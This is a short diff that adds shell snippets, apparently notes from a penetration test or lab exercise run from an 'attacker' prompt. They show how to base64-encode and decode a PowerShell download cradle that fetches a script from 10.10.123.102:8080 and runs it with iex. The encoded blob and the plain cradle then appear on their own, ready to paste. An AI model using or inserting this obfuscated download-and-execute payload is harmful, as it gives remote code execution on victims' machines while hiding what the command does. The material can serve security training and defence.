@@ -1,0 +1,18 @@
+```bash
+attacker@ubuntu ~ [0|0|1]> echo "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8
+AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMgAzAC4AMQAwADIAOgA4ADAAOAAwAC8AYgApAAoA" | bas
+e64 -d -w 0
+iex (new-object net.webclient).downloadstring(http://10.10.123.102:8080/b)
+```
+
+```bash
+attacker@ubuntu ~ [0|0|1]> echo "iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")" | iconv -t UTF-16LE | base64 -w 0
+aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMgAzAC4AMQAwADIAOgA4ADAAOAAwAC8AYgApAAoA
+attacker@ubuntu ~>
+```
+
+```bash
+aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMgAzAC4AMQAwADIAOgA4ADAAOAAwAC8AYgApAAoA
+```
+
+iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")
